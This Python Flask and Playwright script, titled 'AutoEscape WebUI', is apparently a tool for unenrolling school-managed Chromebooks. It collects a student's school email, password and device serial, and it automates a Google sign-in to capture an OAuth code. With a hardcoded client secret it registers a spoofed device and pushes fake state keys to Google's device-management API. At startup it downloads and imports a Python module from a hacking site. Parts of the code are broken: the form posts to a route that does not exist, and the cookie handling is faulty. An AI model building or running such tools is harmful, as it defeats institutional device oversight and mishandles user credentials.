from playwright.sync_api import sync_playwright
from flask import Flask, request, jsonify, send_file
import json
import time
import sys
import subprocess
import uuid
import requests
import importlib
import os
import urllib.request
import traceback

app = Flask(__name__)

def check_pb2():
    try:
        import device_management_backend_pb2 as proto
    except ImportError:
        urllib.request.urlretrieve("https://www.untitledhacking.com/cros/me/device_management_backend_pb2.py", "device_management_backend_pb2.py")
        import device_management_backend_pb2 as proto
    return proto

def get_oauth(email:str, password:str):
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True, slow_mo=100)
        context = browser.new_context(
            user_agent="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                       "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        )
        page = context.new_page()

        try:
            page.goto("https://accounts.google.com/v3/signin/identifier?flow=deviceEnrollment&flowName=GlifSetupChromeOs",  wait_until="networkidle")

            page.fill('input[id="identifierId"]', email)
            page.keyboard.press("Enter")    
            page.wait_for_timeout(1500 )
            page.fill('input[type="password"]', password)
            page.keyboard.press("Enter" )
            print( "Waiting for login to complete..." )
            page.wait_for_timeout(1000)

            cookies = context.cookies()
            for c in cookies:
                if c["name"] == "oauth_code":
                    oauth = c["value"]

        except Exception as e:
            print(e)
        finally:
            browser.close()
        return(c["value"])

def unenroll(serial_number:str, oauth_code:str):
    response = requests.post(
        "https://www.googleapis.com/oauth2/v4/token",
        data={
            "code": oauth_code,
            "client_id": "77185425430.apps.googleusercontent.com",
            "client_secret": "OTJgUOQcT7lO7GsGZq2G4IlT",
            "grant_type": "authorization_code",
        },
    )

    if not response.ok:
        print("there was an error. generate a new oauth code.")

    refresh_token = response.json()["refresh_token"]

    response = requests.post(
        "https://www.googleapis.com/oauth2/v4/token",
        data={
            "client_id": "77185425430.apps.googleusercontent.com",
            "client_secret": "OTJgUOQcT7lO7GsGZq2G4IlT",
            "grant_type": "refresh_token",
            "refresh_token": refresh_token,
            "scope": "https://www.googleapis.com/auth/chromeosdevicemanagement https://www.googleapis.com/auth/userinfo.email",
        },
    )

    response.raise_for_status()
    oauth_token = response.json()["access_token"]

    device_id = str(uuid.uuid4())
    register_request = proto.DeviceRegisterRequest()
    register_request.type = proto.DeviceRegisterRequest.DEVICE
    register_request.machine_id = serial_number
    request = proto.DeviceManagementRequest()
    request.register_request.CopyFrom(register_request)

    response = requests.post(
        f"https://m.google.com/devicemanagement/data/api?devicetype=2&apptype=Chrome&request=register&deviceid={device_id}&oauth_token={oauth_token}",
        headers={
            "Content-Type": "application/protobuf",
        },
        data=request.SerializeToString(),
    )

    data = proto.DeviceManagementResponse()
    data.ParseFromString(response.content)

    if data.error_message:
        print(data.error_message)

    dmtoken = data.register_response.device_management_token

    policy_fetch_request = proto.PolicyFetchRequest()
    policy_fetch_request.policy_type = "google/chromeos/device"

    state_key_update_request = proto.DeviceStateKeyUpdateRequest()
    for _ in range(5):
        state_key_update_request.server_backed_state_keys.append(os.urandom(32))

    request = proto.DeviceManagementRequest()
    request.policy_request.requests.append(policy_fetch_request)
    request.device_state_key_update_request.CopyFrom(state_key_update_request)

    requests.post(
        f"https://m.google.com/devicemanagement/data/api?retry=false&apptype=Chrome&deviceid={device_id}&devicetype=2&request=policy",
        headers={
            "Authorization": f"GoogleDMToken token={dmtoken}",
            "Content-Type": "application/protobuf",
        },
        data=request.SerializeToString(),
    )

@app.post("/api/run")
def run():
    data = request.get_json()

    ggl = data["email"]
    pw = data["pass"]
    sn = data["serial"]

    oauth = get_oauth(ggl, pw)
    unenroll(sn, oauth)

    return jsonify({
        "output": "This was MOST LIKELY a success. Wait 5 minutes, then do ESC + REFRESH + POWER, CTRL + D, ENTER, wait, ENTER. Continue to set up normally.",
        "returncode": "Success"
    })

@app.route('/')
def home():
    return """html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Send Data</title>
</head>
<body>
    <h1>AutoEscape WebUI</h1>

    <form id="data-form">
        <label for="email">School Email</label>
        <input type="text" id="email" required>

        <br><br>

        <label for="pass">Password</label>
        <input type="text" id="pass" required>

        <br><br>

        <label for="serial">Serial Number (Lock Screen ALT+V, Top Right)</label>
        <input type="text" id="serial" required>

        <br><br>

        <button type="submit">Send</button>
    </form>

    <p id="status"></p>

    <script>
        document.getElementById("data-form").addEventListener(
            "submit",
            async (event) => {
                event.preventDefault();

                const data = {
                    email: document.getElementById("email").value,
                    pass: document.getElementById("pass").value,
                    serial: document.getElementById("serial").value
                };

                const status = document.getElementById("status");
                status.textContent = "Sending...";

                try {
                    const response = await fetch("/submit", {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json"
                        },
                        body: JSON.stringify(data)
                    });

                    const result = await response.json();

                    if (!response.ok) {
                        throw new Error(result.error || "Request failed");
                    }

                    status.textContent = result.message;
                } catch (error) {
                    status.textContent = "Error: " + error.message;
                }
            }
        );
    </script>
</body>
</html>
"""

if __name__ == "__main__":
    proto = check_pb2()
    app.run(host="0.0.0.0", port=5000)